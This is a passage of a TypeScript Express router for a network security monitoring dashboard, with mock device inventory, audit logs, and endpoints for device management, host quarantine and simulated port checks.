import express, { type Request, type Response } from 'express';
import { globalAttackSignatureEngine } from './attackSignatureEngine.ts';
import { globalFlowCollectorEngine } from './flowCollectorEngine.ts';
const Router = express.Router;

export interface NetworkFlowRecord {
  id: string;
  timestamp: string;
  srcIp: string;
  srcPort: number;
  srcDeviceId?: string;
  srcDeviceName?: string;
  dstIp: string;
  dstPort: number;
  dstDeviceId?: string;
  dstDeviceName?: string;
  protocol: 'TCP' | 'UDP' | 'ICMP' | 'Modbus' | 'S7Comm' | 'DNP3' | 'DNS' | 'HTTP' | 'HTTPS' | 'SSH';
  bytes: number;
  packets: number;
  durationMs: number;
  flags: string[];
  bps: number;
  pps: number;
  threatLevel: 'normal' | 'suspicious' | 'malicious';
  signatureMatch?: {
    signatureId: string;
    signatureName: string;
    mitreTTP: string;
    mitreTactic: string;
    mitreStage: string;
    confidence: number;
    riskScore: number;
    description: string;
    cve?: string;
  };
  sampledInterface: string;
  status: 'active' | 'blocked' | 'monitored';
  deviceFingerprint?: {
    deviceType: string;
    os: string;
    vendor: string;
    model?: string;
    confidence: number;
    fingerbankId?: number;
    matchMethod: string;
  };
}

export interface NetworkDevice {
  id: string;
  name: string;
  nameZh?: string;
  type: 'firewall' | 'switch' | 'server' | 'endpoint' | 'router' | 'ap';
  ip: string;
  mac: string;
  subnet: string;
  vlan: number;
  status: 'online' | 'offline' | 'warning';
  x?: number;
  y?: number;
  details?: string;
  cpu: number;
  ram: number;
  disk: number;
  disk_capacity: string;
  networkThroughput: string;
  trafficIn: string;
  trafficOut: string;
  packetLoss: string;
  latency: string;
  software: string[];
  processes: string[];
  os_version: string;
  update_version: string;
  vendor: string;
  model: string;
  openPorts: { port: number; proto: string; service: string; state: 'open' | 'filtered' }[];
  cveAlerts?: { cve: string; title: string; severity: 'Critical' | 'High' | 'Medium' }[];
  cpuThreshold: number;
  ramThreshold: number;
  diskThreshold: number;
}

export interface NetworkConnection {
  from: string;
  to: string;
  speed: string;
  type: 'fiber' | 'copper' | 'wireless' | 'trunk';
  utilization: number;
}

export function createNetworkRouter(broadcastUpdate?: (data: any) => void) {
  const router = Router();

  // Initial Clean State for Physical Environment Ingestion
  let networkDevices: NetworkDevice[] = [];
  let networkConnections: NetworkConnection[] = [];
  const _templateDevices: NetworkDevice[] = [
    { 
      id: 'fw-01', 
      name: 'Gateway-Firewall-PA', 
      nameZh: '邊界核心次世代防火牆', 
      type: 'firewall', 
      ip: '211.23.131.21 / 10.88.88.1', 
      mac: '00:1B:17:C3:41:01',
      subnet: '10.88.88.0/24 (WAN/Gateway)',
      vlan: 1,
      status: 'online', 
      details: 'Palo Alto PA-5260 (次世代應用威脅防護)',
      cpu: 24,
      ram: 46,
      disk: 32,
      disk_capacity: '2TB NVMe',
      networkThroughput: '8.4 Gbps',
      trafficIn: '5.1 Gbps',
      trafficOut: '3.3 Gbps',
      packetLoss: '0.001%',
      latency: '0.8 ms',
      software: ['PAN-OS 11.0.2', 'GlobalProtect Gateway', 'WildFire Threat Agent', 'SSL Decrypt Engine'],
      processes: ['pan-mgmtsd', 'pan-logd', 'pan-pktlog', 'pan-autod', 'sshd'],
      os_version: 'PAN-OS 11.0.2-h3',
      update_version: '動態特徵碼庫 v8824 (2026/08/20 更新)',
      vendor: 'Palo Alto Networks',
      model: 'PA-5260 Enterprise',
      openPorts: [
        { port: 443, proto: 'TCP', service: 'HTTPS (Management)', state: 'open' },
        { port: 22, proto: 'TCP', service: 'SSH (Admin)', state: 'open' },
        { port: 500, proto: 'UDP', service: 'IPsec IKE', state: 'open' },
        { port: 4500, proto: 'UDP', service: 'IPsec NAT-T', state: 'open' }
      ],
      cveAlerts: [],
      cpuThreshold: 80,
      ramThreshold: 85,
      diskThreshold: 90
    },
    { 
      id: 'core-sw-01', 
      name: 'Core-Catalyst-9500', 
      nameZh: '骨幹核心交換機-01', 
      type: 'switch', 
      ip: '10.88.88.254', 
      mac: '70:69:79:A1:00:FE',
      subnet: '10.88.88.0/24 (Core Backbone)',
      vlan: 1,
      status: 'online', 
      details: 'Cisco Catalyst 9500 40G 高速骨幹核心',
      cpu: 38,
      ram: 62,
      disk: 14,
      disk_capacity: '512GB SSD',
      networkThroughput: '18.2 Gbps',
      trafficIn: '10.5 Gbps',
      trafficOut: '7.7 Gbps',
      packetLoss: '0.000%',
      latency: '0.2 ms',
      software: ['Cisco IOS-XE 17.12.01', 'Cisco DNA Center Agent', 'SNMPv3', 'NetFlow v9/IPFIX'],
      processes: ['ios-xe', 'sw_prog_platform', 'fman_fp', 'snmpd', 'stp_mgr'],
      os_version: 'Cisco IOS-XE 17.12.01a',
      update_version: 'Cisco Gold Star 韌體認證',
      vendor: 'Cisco Systems',
      model: 'Catalyst 9500-32QC',
      openPorts: [
        { port: 22, proto: 'TCP', service: 'SSH Management', state: 'open' },
        { port: 161, proto: 'UDP', service: 'SNMPv3 Agent', state: 'open' },
        { port: 2055, proto: 'UDP', service: 'NetFlow Flow-Export', state: 'open' }
      ],
      cpuThreshold: 85,
      ramThreshold: 80,
      diskThreshold: 85
    },
    { 
      id: 'srv-sw-01', 
      name: 'Server-Farm-Switch', 
      nameZh: '伺服器機房分發交換機', 
      type: 'switch', 
      ip: '10.88.88.253', 
      mac: '70:69:79:B2:01:FD',
      subnet: '10.88.88.0/24 (DMZ & Server Cluster)',
      vlan: 20,
      status: 'online', 
      details: 'Nexus 9300 伺服器叢集專用交換網段',
      cpu: 18,
      ram: 34,
      disk: 9,
      disk_capacity: '256GB',
      networkThroughput: '7.8 Gbps',
      trafficIn: '4.2 Gbps',
      trafficOut: '3.6 Gbps',
      packetLoss: '0.000%',
      latency: '0.3 ms',
      software: ['NX-OS 10.3(2)F', 'Telemetry Streaming', 'SNMPv3'],
      processes: ['nxos_core', 'lacp_mgr', 'vlan_mgr', 'acl_mgr'],
      os_version: 'Cisco NX-OS 10.3(2)F',
      update_version: 'Enterprise Release Patch 4',
      vendor: 'Cisco Systems',
      model: 'Nexus 93180YC-FX',
      openPorts: [
        { port: 22, proto: 'TCP', service: 'SSH', state: 'open' },
        { port: 161, proto: 'UDP', service: 'SNMP', state: 'open' }
      ],
      cpuThreshold: 80,
      ramThreshold: 80,
      diskThreshold: 85
    },
    { 
      id: 'edge-sw-01', 
      name: 'Edge-Access-SW01', 
      nameZh: '辦公區存取層交換機-01', 
      type: 'switch', 
      ip: '10.88.88.252', 
      mac: '24:DE:C6:11:42:FC',
      subnet: '10.88.88.0/24 (User Access Segment)',
      vlan: 10,
      status: 'online', 
      details: 'Aruba CX 6300M PoE 樓層終端接入交換機',
      cpu: 22,
      ram: 45,
      disk: 12,
      disk_capacity: '256GB',
      networkThroughput: '2.4 Gbps',
      trafficIn: '1.5 Gbps',
      trafficOut: '0.9 Gbps',
      packetLoss: '0.002%',
      latency: '0.5 ms',
      software: ['AOS-CX 10.13.1000', 'Aruba AirWave Agent', '802.1X Auth Engine'],
      processes: ['aos-cx-core', 'auth-mgr', 'lldpd', 'dot1x_agent'],
      os_version: 'ArubaOS-CX 10.13.1000',
      update_version: '2026/05 官方穩定版',
      vendor: 'Aruba (HPE)',
      model: 'Aruba CX 6300M 48G PoE',
      openPorts: [
        { port: 22, proto: 'TCP', service: 'SSH', state: 'open' },
        { port: 161, proto: 'UDP', service: 'SNMPv3', state: 'open' }
      ],
      cpuThreshold: 80,
      ramThreshold: 80,
      diskThreshold: 85
    },
    { 
      id: 'srv-db-01', 
      name: 'DB-PostgreSQL-Cluster', 
      nameZh: '主資料庫伺服器 (Master)', 
      type: 'server', 
      ip: '10.88.88.200', 
      mac: '52:54:00:9A:88:C8',
      subnet: '10.88.88.0/24 (DB-Cluster)',
      vlan: 20,
      status: 'online', 
      details: 'Ubuntu 24.04 LTS / PostgreSQL 16.2 雙向同步熱備節點',
      cpu: 64,
      ram: 78,
      disk: 65,
      disk_capacity: '8TB Enterprise NVMe RAID-10',
      networkThroughput: '3.6 Gbps',
      trafficIn: '2.1 Gbps',
      trafficOut: '1.5 Gbps',
      packetLoss: '0.000%',
      latency: '0.4 ms',
      software: ['PostgreSQL 16.2', 'PgBouncer 1.22', 'Prometheus Node Exporter', 'Wazuh Agent', 'Docker'],
      processes: ['postgres', 'pgbouncer', 'node_exporter', 'wazuh-agentd', 'systemd-journald'],
      os_version: 'Ubuntu 24.04.1 LTS (Noble Numbat)',
      update_version: 'Linux Kernel 6.8.0-38-generic',
      vendor: 'Dell PowerEdge',
      model: 'R760 Dual Xeon Gold 6430',
      openPorts: [
        { port: 5432, proto: 'TCP', service: 'PostgreSQL Database', state: 'open' },
        { port: 6432, proto: 'TCP', service: 'PgBouncer Connection Pool', state: 'open' },
        { port: 9100, proto: 'TCP', service: 'Node Exporter', state: 'open' },
        { port: 22, proto: 'TCP', service: 'SSH', state: 'open' }
      ],
      cveAlerts: [
        { cve: 'CVE-2024-4317', title: 'PostgreSQL pg_dump 記憶體讀取邊界檢查建議更新修補', severity: 'Medium' }
      ],
      cpuThreshold: 85,
      ramThreshold: 90,
      diskThreshold: 85
    },
    { 
      id: 'srv-app-01', 
      name: 'App-Kubernetes-Master', 
      nameZh: '核心應用容器叢集控制節點', 
      type: 'server', 
      ip: '10.88.88.201', 
      mac: '52:54:00:9A:88:C9',
      subnet: '10.88.88.0/24 (App Tier)',
      vlan: 20,
      status: 'online', 
      details: 'Kubernetes v1.30.1 / Containerd 應用層微服務叢集',
      cpu: 48,
      ram: 68,
      disk: 42,
      disk_capacity: '4TB NVMe SSD',
      networkThroughput: '4.2 Gbps',
      trafficIn: '2.4 Gbps',
      trafficOut: '1.8 Gbps',
      packetLoss: '0.000%',
      latency: '0.4 ms',
      software: ['Kubernetes v1.30.1', 'Containerd 1.7', 'Cilium eBPF CNI', 'CrowdStrike Falcon Sensor'],
      processes: ['kube-apiserver', 'kube-controller', 'cilium-agent', 'containerd', 'falcon-sensor'],
      os_version: 'Red Hat Enterprise Linux 9.4 (Plow)',
      update_version: 'Kernel 5.14.0-427.el9.x86_64',
      vendor: 'HPE ProLiant',
      model: 'DL380 Gen11',
      openPorts: [
        { port: 6443, proto: 'TCP', service: 'Kubernetes API Server', state: 'open' },
        { port: 2379, proto: 'TCP', service: 'etcd Key-Value Store', state: 'open' },
        { port: 10250, proto: 'TCP', service: 'Kubelet API', state: 'open' },
        { port: 22, proto: 'TCP', service: 'SSH', state: 'open' }
      ],
      cpuThreshold: 80,
      ramThreshold: 85,
      diskThreshold: 85
    },
    { 
      id: 'srv-ad-01', 
      name: 'DC-ActiveDirectory-01', 
      nameZh: '網域控制站與身分驗證伺服器', 
      type: 'server', 
      ip: '10.88.88.202', 
      mac: '00:50:56:B9:44:A1',
      subnet: '10.88.88.0/24 (Identity & IAM)',
      vlan: 20,
      status: 'online', 
      details: 'Windows Server 2022 Datacenter (AD DS / DNS / Kerberos / PKI)',
      cpu: 32,
      ram: 58,
      disk: 28,
      disk_capacity: '1TB SAS RAID',
      networkThroughput: '1.1 Gbps',
      trafficIn: '0.7 Gbps',
      trafficOut: '0.4 Gbps',
      packetLoss: '0.000%',
      latency: '0.3 ms',
      software: ['Active Directory Domain Services', 'Microsoft DNS Server', 'Kerberos KDC', 'Defender for Identity'],
      processes: ['lsass.exe', 'ntoskrnl.exe', 'dns.exe', 'svchost.exe', 'MsSenseIR.exe'],
      os_version: 'Windows Server 2022 Datacenter 21H2 (組建 20348.2461)',
      update_version: 'KB5037765 (2026 年累積更新)',
      vendor: 'VMware ESXi 8.0 Virtual Machine',
      model: 'Virtual Platform',
      openPorts: [
        { port: 53, proto: 'UDP/TCP', service: 'Domain DNS', state: 'open' },
        { port: 88, proto: 'TCP/UDP', service: 'Kerberos v5 Authentication', state: 'open' },
        { port: 389, proto: 'TCP', service: 'LDAP Directory Service', state: 'open' },
        { port: 636, proto: 'TCP', service: 'LDAPS (SSL/TLS)', state: 'open' },
        { port: 445, proto: 'TCP', service: 'Microsoft-DS SMB Active', state: 'open' }
      ],
      cpuThreshold: 75,
      ramThreshold: 85,
      diskThreshold: 80
    },
    { 
      id: 'srv-siem-01', 
      name: 'SEMOR-SIEM-Ingestion', 
      nameZh: 'SEMOR SIEM 日誌串流採集節點', 
      type: 'server', 
      ip: '10.88.88.203', 
      mac: '52:54:00:B8:33:EE',
      subnet: '10.88.88.0/24 (Security Analytics)',
      vlan: 20,
      status: 'online', 
      details: 'SEMOR Cyber NG-SIEM 高速日誌過濾與 OpenSearch 分布式節點',
      cpu: 72,
      ram: 84,
      disk: 58,
      disk_capacity: '16TB All-Flash NVMe Array',
      networkThroughput: '6.8 Gbps',
      trafficIn: '4.9 Gbps',
      trafficOut: '1.9 Gbps',
      packetLoss: '0.000%',
      latency: '0.2 ms',
      software: ['OpenSearch 2.14.0', 'Vector Pipeline', 'Kafka Cluster 3.7', 'SEMOR AI Engine'],
      processes: ['opensearch', 'vector', 'kafka', 'semor-ai-daemon', 'node'],
      os_version: 'Rocky Linux 9.4 (Blue Onyx)',
      update_version: 'Kernel 5.14.0-427.13.1.el9_4.x86_64',
      vendor: 'Supermicro Ultra Enterprise',
      model: 'SYS-221U-TNR 2U',
      openPorts: [
        { port: 9200, proto: 'TCP', service: 'OpenSearch REST API', state: 'open' },
        { port: 9092, proto: 'TCP', service: 'Apache Kafka Stream', state: 'open' },
        { port: 514, proto: 'UDP/TCP', service: 'Syslog Ingestion Collector', state: 'open' },
        { port: 2055, proto: 'UDP', service: 'NetFlow Parser', state: 'open' }
      ],
      cpuThreshold: 90,
      ramThreshold: 92,
      diskThreshold: 90
    },
    ...Array.from({ length: 8 }).map((_, i) => ({
      id: `ws-sec-${i+1}`,
      name: `SOC-Analyst-WS0${i+1}`,
      nameZh: `資安監控分析席工作站 0${i+1}`,
      type: 'endpoint' as const,
      ip: `10.88.88.${100 + i}`,
      mac: `00:E0:4C:68:${(10+i).toString(16).toUpperCase()}:${(20+i).toString(16).toUpperCase()}`,
      subnet: '10.88.88.0/24 (SOC Analyst VLAN)',
      vlan: 10,
      status: i === 6 ? ('warning' as const) : ('online' as const),
      details: 'Windows 11 Enterprise 專用分析端點 (含 EDR 與 TPM 2.0 雙重認證)',
      cpu: i === 6 ? 89 : 14 + (i * 3),
      ram: i === 6 ? 91 : 42 + (i * 2),
      disk: 54,
      disk_capacity: '1TB PCIe 4.0 NVMe SSD',
      networkThroughput: i === 6 ? '780 Mbps (高頻連線)' : '320 Mbps',
      trafficIn: '180 Mbps',
      trafficOut: '140 Mbps',
      packetLoss: i === 6 ? '0.05%' : '0.000%',
      latency: '1.1 ms',
      software: ['Windows 11 Enterprise 23H2', 'Microsoft Defender XDR', 'Wireshark 4.2', 'CyberChef', 'VS Code'],
      processes: ['explorer.exe', 'SenseCncProxy.exe', 'wireshark.exe', 'chrome.exe', 'powershell.exe'],
      os_version: 'Windows 11 Enterprise 23H2 (組建 22631.3593)',
      update_version: 'KB5037771 (2026 最新安全性更新)',
      vendor: 'Lenovo ThinkStation',
      model: 'P360 Ultra Workstation',
      openPorts: [
        { port: 135, proto: 'TCP', service: 'Microsoft RPC', state: 'filtered' as const },
        { port: 445, proto: 'TCP', service: 'SMB', state: 'filtered' as const }
      ],
      cveAlerts: i === 6 ? [
        { cve: 'CVE-2024-30078', title: 'Windows Wi-Fi 驅動程式未修補異常通訊偵測', severity: 'High' as const }
      ] : [],
      cpuThreshold: 80,
      ramThreshold: 85,
      diskThreshold: 90
    }))
  ];

  const _templateConnections: NetworkConnection[] = [
    { from: 'fw-01', to: 'core-sw-01', speed: '40 Gbps', type: 'fiber', utilization: 34 },
    { from: 'core-sw-01', to: 'srv-sw-01', speed: '40 Gbps', type: 'fiber', utilization: 42 },
    { from: 'core-sw-01', to: 'edge-sw-01', speed: '10 Gbps', type: 'fiber', utilization: 28 },
    { from: 'srv-sw-01', to: 'srv-db-01', speed: '10 Gbps', type: 'fiber', utilization: 55 },
    { from: 'srv-sw-01', to: 'srv-app-01', speed: '10 Gbps', type: 'fiber', utilization: 62 },
    { from: 'srv-sw-01', to: 'srv-ad-01', speed: '10 Gbps', type: 'copper', utilization: 18 },
    { from: 'srv-sw-01', to: 'srv-siem-01', speed: '25 Gbps', type: 'fiber', utilization: 78 },
    ...Array.from({ length: 8 }).map((_, i) => ({
      from: 'edge-sw-01',
      to: `ws-sec-${i+1}`,
      speed: '1 Gbps',
      type: 'copper' as const,
      utilization: 12 + i * 4
    }))
  ];

  // Helper for computing KPI stats
  const calculateKpiStats = () => {
    const total = networkDevices.length;
    const online = networkDevices.filter(d => d.status === 'online').length;
    const warning = networkDevices.filter(d => d.status === 'warning').length;
    const offline = networkDevices.filter(d => d.status === 'offline').length;
    const avgCpu = Math.round(networkDevices.reduce((acc, cur) => acc + cur.cpu, 0) / (total || 1));
    const avgRam = Math.round(networkDevices.reduce((acc, cur) => acc + cur.ram, 0) / (total || 1));
    const totalThroughputGbps = Number(
      networkConnections.reduce((sum, c) => {
        const num = parseFloat(c.speed) || 1;
        return sum + (num * (c.utilization / 100));
      }, 0).toFixed(1)
    );

    return {
      total,
      online,
      warning,
      offline,
      avgCpu,
      avgRam,
      totalThroughputGbps,
      activeConnectionsCount: networkConnections.length
    };
  };

  // Audit Logs Store
  interface NetworkAuditLog {
    id: string;
    timestamp: string;
    deviceId: string;
    deviceName: string;
    ip: string;
    operator: string;
    action: string;
    details: string;
    status: 'PASSED' | 'WARNING' | 'ALERT' | 'QUARANTINED';
  }

  let auditLogs: NetworkAuditLog[] = [
    {
      id: 'AUD-2026-9001',
      timestamp: new Date(Date.now() - 3600000).toISOString(),
      deviceId: 'fw-01',
      deviceName: 'Gateway-Firewall-PA',
      ip: '211.23.131.21',
      operator: 'SYSTEM-NAC',
      action: 'FIREWALL_SESSION_AUDIT',
      details: '通過次世代應用層特徵比對，未發現異常穿透連線',
      status: 'PASSED'
    },
    {
      id: 'AUD-2026-9002',
      timestamp: new Date(Date.now() - 1800000).toISOString(),
      deviceId: 'ws-sec-7',
      deviceName: 'SOC-Analyst-WS07',
      ip: '10.88.88.106',
      operator: 'EDR-AGENT-DEFENDER',
      action: 'ENDPOINT_COMPLIANCE_CHECK',
      details: '偵測到 CVE-2024-30078 潛在 Wi-Fi 驅動程式漏洞示警，建議隔離檢修',
      status: 'WARNING'
    }
  ];

  // Diagnostic history store
  interface DiagnosticRecord {
    id: string;
    timestamp: string;
    targetId: string;
    targetName: string;
    targetIp: string;
    type: string;
    output: string[];
    summary: string;
  }
  let diagnosticHistory: DiagnosticRecord[] = [];

  // Latest Scan Status store
  let latestScanJob = {
    inProgress: false,
    progressPct: 100,
    lastScannedAt: new Date().toISOString(),
    subnet: '10.88.88.0/24',
    logs: [
      '[LLDP/CDP] 成功與核心交換機 Catalyst 9500 (10.88.88.254) 完成 802.1AB 鄰居探測',
      '[SNMPv3] 取得 OID 1.3.6.1.2.1.2.2 介面流量統計與 MIB-II 拓撲矩陣',
      '[NetFlow/IPFIX] 即時關聯 40Gbps 骨幹流量通訊路徑與 Session 負載',
      '[安全防護] 掃描各端點 EDR 探針與 CVE 漏洞庫特徵比對完成'
    ]
  };

  // 1. GET /api/v1/network/devices (List with search & filter)
  router.get('/devices', (req: Request, res: Response) => {
    const { type, status, subnet, search, vlan } = req.query;
    let list = [...networkDevices];

    if (type && type !== 'all') {
      list = list.filter(d => d.type === type);
    }
    if (status && status !== 'all') {
      list = list.filter(d => d.status === status);
    }
    if (subnet && subnet !== 'all' && typeof subnet === 'string') {
      list = list.filter(d => d.subnet.includes(subnet));
    }
    if (vlan && vlan !== 'all') {
      list = list.filter(d => d.vlan === Number(vlan));
    }
    if (search && typeof search === 'string') {
      const q = search.toLowerCase();
      list = list.filter(d =>
        d.name.toLowerCase().includes(q) ||
        (d.nameZh && d.nameZh.toLowerCase().includes(q)) ||
        d.ip.toLowerCase().includes(q) ||
        d.mac.toLowerCase().includes(q) ||
        d.os_version.toLowerCase().includes(q)
      );
    }

    res.json({
      success: true,
      count: list.length,
      devices: list,
      connections: networkConnections,
      kpiStats: calculateKpiStats()
    });
  });

  // 1.1 POST /api/v1/network/devices (Add new device)
  router.post('/devices', (req: Request, res: Response) => {
    const body = req.body;
    if (!body.name || !body.ip) {
      return res.status(400).json({ success: false, error: 'Device name and IP are required' });
    }

    const newId = body.id || `dev-${Date.now().toString(36)}`;
    const newDevice: NetworkDevice = {
      id: newId,
      name: body.name,
      nameZh: body.nameZh || body.name,
      type: body.type || 'server',
      ip: body.ip,
      mac: body.mac || `00:50:56:${Math.floor(Math.random()*89+10)}:${Math.floor(Math.random()*89+10)}:${Math.floor(Math.random()*89+10)}`,
      subnet: body.subnet || '10.88.88.0/24 (Manual Added)',
      vlan: body.vlan || 10,
      status: body.status || 'online',
      details: body.details || 'Manually added monitored infrastructure asset',
      cpu: body.cpu ?? 15,
      ram: body.ram ?? 25,
      disk: body.disk ?? 20,
      disk_capacity: body.disk_capacity || '512GB SSD',
      networkThroughput: body.networkThroughput || '100 Mbps',
      trafficIn: body.trafficIn || '60 Mbps',
      trafficOut: body.trafficOut || '40 Mbps',
      packetLoss: body.packetLoss || '0.000%',
      latency: body.latency || '0.5 ms',
      software: body.software || ['Monitoring Agent v2.4'],
      processes: body.processes || ['systemd', 'sshd', 'agent'],
      os_version: body.os_version || 'Linux 6.8 Enterprise',
      update_version: body.update_version || 'Latest Stable Patch',
      vendor: body.vendor || 'Generic Enterprise',
      model: body.model || 'Standard Compute Unit',
      openPorts: body.openPorts || [
        { port: 22, proto: 'TCP', service: 'SSH', state: 'open' }
      ],
      cveAlerts: body.cveAlerts || [],
      cpuThreshold: body.cpuThreshold || 80,
      ramThreshold: body.ramThreshold || 85,
      diskThreshold: body.diskThreshold || 90
    };

    networkDevices.push(newDevice);

    // Auto-link to core switch if available
    const coreSwitch = networkDevices.find(d => d.type === 'switch');
    if (coreSwitch && coreSwitch.id !== newId) {
      networkConnections.push({
        from: coreSwitch.id,
        to: newId,
        speed: '1 Gbps',
        type: 'copper',
        utilization: Math.floor(Math.random() * 25 + 5)
      });
    }

    res.status(201).json({
      success: true,
      message: `設備 ${newDevice.name} (${newDevice.ip}) 已加入基礎設施拓撲監控清冊`,
      device: newDevice,
      kpiStats: calculateKpiStats()
    });
  });

  // 1.2 DELETE /api/v1/network/devices/:id
  router.delete('/devices/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const idx = networkDevices.findIndex(d => d.id === id);
    if (idx === -1) {
      return res.status(404).json({ success: false, error: 'Device not found' });
    }

    const removed = networkDevices.splice(idx, 1)[0];
    // Remove connected links
    networkConnections = networkConnections.filter(c => c.from !== id && c.to !== id);

    res.json({
      success: true,
      message: `設備 ${removed.name} (${removed.ip}) 已從監控清冊移除`,
      kpiStats: calculateKpiStats()
    });
  });

  // 2. GET /api/v1/network/devices/:id
  router.get('/devices/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const connectedTo = networkConnections
      .filter(c => c.from === id || c.to === id)
      .map(c => ({
        neighborId: c.from === id ? c.to : c.from,
        speed: c.speed,
        type: c.type,
        utilization: c.utilization
      }));

    const devAudit = auditLogs.filter(a => a.deviceId === id);

    res.json({
      success: true,
      device: dev,
      connections: connectedTo,
      auditHistory: devAudit
    });
  });

  // 3. PATCH /api/v1/network/devices/:id/thresholds
  router.patch('/devices/:id/thresholds', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const { cpuThreshold, ramThreshold, diskThreshold } = req.body;
    if (typeof cpuThreshold === 'number') dev.cpuThreshold = Math.min(100, Math.max(10, cpuThreshold));
    if (typeof ramThreshold === 'number') dev.ramThreshold = Math.min(100, Math.max(10, ramThreshold));
    if (typeof diskThreshold === 'number') dev.diskThreshold = Math.min(100, Math.max(10, diskThreshold));

    // Dynamic warning evaluation
    if (dev.status !== 'offline') {
      if (dev.cpu > dev.cpuThreshold || dev.ram > dev.ramThreshold || dev.disk > dev.diskThreshold) {
        dev.status = 'warning';
      } else if (dev.status === 'warning' && (!dev.cveAlerts || dev.cveAlerts.length === 0)) {
        dev.status = 'online';
      }
    }

    res.json({
      success: true,
      message: `設備 ${dev.name} 告警閾值已成功更新 (CPU: ${dev.cpuThreshold}%, RAM: ${dev.ramThreshold}%, Disk: ${dev.diskThreshold}%)`,
      device: dev,
      kpiStats: calculateKpiStats()
    });
  });

  // 4. PATCH /api/v1/network/devices/:id
  router.patch('/devices/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    Object.assign(dev, req.body);
    res.json({
      success: true,
      message: `設備 ${dev.name} 參數已更新`,
      device: dev,
      kpiStats: calculateKpiStats()
    });
  });

  // 4.1 POST /api/v1/network/devices/:id/isolate (Quarantine via 802.1X NAC)
  router.post('/devices/:id/isolate', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const prevVlan = dev.vlan;
    dev.vlan = 999;
    dev.status = 'warning';
    dev.details = `[已安全隔離] NAC 動態下發隔離區 VLAN 999 (原 VLAN ${prevVlan})`;

    const auditEntry: NetworkAuditLog = {
      id: `AUD-${Date.now()}`,
      timestamp: new Date().toISOString(),
      deviceId: dev.id,
      deviceName: dev.name,
      ip: dev.ip,
      operator: 'SOC-Analyst',
      action: 'HOST_ISOLATION_QUARANTINE',
      details: `因資安威脅或合規異常，主機已移至隔離網段 VLAN 999，已限制非管理通道通訊`,
      status: 'QUARANTINED'
    };
    auditLogs.unshift(auditEntry);

    res.json({
      success: true,
      message: `設備 ${dev.name} (${dev.ip}) 已由 NAC 下發 CoA 轉移至隔離區 VLAN 999`,
      device: dev,
      auditEntry,
      kpiStats: calculateKpiStats()
    });
  });

  // 4.2 POST /api/v1/network/devices/:id/restore (Restore from quarantine)
  router.post('/devices/:id/restore', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const defaultVlan = dev.type === 'switch' || dev.type === 'firewall' ? 1 : (dev.type === 'server' ? 20 : 10);
    dev.vlan = defaultVlan;
    dev.status = 'online';
    dev.details = dev.details?.replace(/\[已安全隔離\].*/, '') || '已解除隔離並恢復正常運作';

    const auditEntry: NetworkAuditLog = {
      id: `AUD-${Date.now()}`,
      timestamp: new Date().toISOString(),
      deviceId: dev.id,
      deviceName: dev.name,
      ip: dev.ip,
      operator: 'SOC-Admin',
      action: 'HOST_RESTORE_PRODUCTION',
      details: `主機已解除隔離，恢復原生產網段 VLAN ${defaultVlan} 通訊權限`,
      status: 'PASSED'
    };
    auditLogs.unshift(auditEntry);

    res.json({
      success: true,
      message: `設備 ${dev.name} (${dev.ip}) 已解除隔離並恢復 VLAN ${defaultVlan} 存取`,
      device: dev,
      auditEntry,
      kpiStats: calculateKpiStats()
    });
  });

  // 4.3 POST /api/v1/network/devices/:id/audit (On-demand deep security audit)
  router.post('/devices/:id/audit', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const auditEntry: NetworkAuditLog = {
      id: `AUD-${Date.now()}`,
      timestamp: new Date().toISOString(),
      deviceId: dev.id,
      deviceName: dev.name,
      ip: dev.ip,
      operator: 'SOC-Analyst-Duty',
      action: 'ON_DEMAND_SECURITY_AUDIT',
      details: `完成設備深度安全審計：開放埠 ${dev.openPorts.map(p => `${p.port}/${p.proto}`).join(', ')}，已安裝套件 ${dev.software.length} 項，CVE 漏洞數 ${dev.cveAlerts?.length || 0}，CPU ${dev.cpu}%，RAM ${dev.ram}%`,
      status: dev.cveAlerts && dev.cveAlerts.length > 0 ? 'WARNING' : 'PASSED'
    };
    auditLogs.unshift(auditEntry);

    res.json({
      success: true,
      message: `主機 [${dev.name}] 深度安全審計已完成並同步記錄至 SIEM 稽核串流`,
      audit: auditEntry
    });
  });

  // 4.4 GET /api/v1/network/devices/:id/audit (Get audit history for device)
  router.get('/devices/:id/audit', (req: Request, res: Response) => {
    const { id } = req.params;
    const logs = auditLogs.filter(a => a.deviceId === id);
    res.json({
      success: true,
      count: logs.length,
      logs
    });
  });

  // 4.5 GET /api/v1/network/audit/logs (All audit logs)
  router.get('/audit/logs', (req: Request, res: Response) => {
    res.json({
      success: true,
      count: auditLogs.length,
      logs: auditLogs
    });
  });

  // 4.6 POST /api/v1/network/devices/:id/test-port (Test specific port connectivity)
  router.post('/devices/:id/test-port', (req: Request, res: Response) => {
    const { id } = req.params;
    const dev = networkDevices.find(d => d.id === id);
    if (!dev) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const portNum = Number(req.body.port) || 22;
    const matched = dev.openPorts.find(p => p.port === portNum);
    const isOpen = !!matched && matched.state === 'open';
    const latencyMs = Number((Math.random() * 1.5 + 0.2).toFixed(2));

    res.json({
      success: true,
      deviceId: dev.id,
      deviceName: dev.name,
      ip: dev.ip,
      port: portNum,
      state: isOpen ? 'open' : (matched ? matched.state : 'closed'),
      service: matched?.service || 'Unknown / Unmapped Service',
      proto: matched?.proto || 'TCP',
      latencyMs,
      handshake: isOpen ? 'SYN-ACK Received in ' + latencyMs + 'ms' : 'Connection Refused (RST)'
    });
  });

  // 5. GET /api/v1/network/connections
  router.get('/connections', (req: Request, res: Response) => {
    res.json({
      success: true,
      count: networkConnections.length,
      connections: networkConnections
    });
  });

  // 5.1 POST /api/v1/network/connections (Add connection)
  router.post('/connections', (req: Request, res: Response) => {
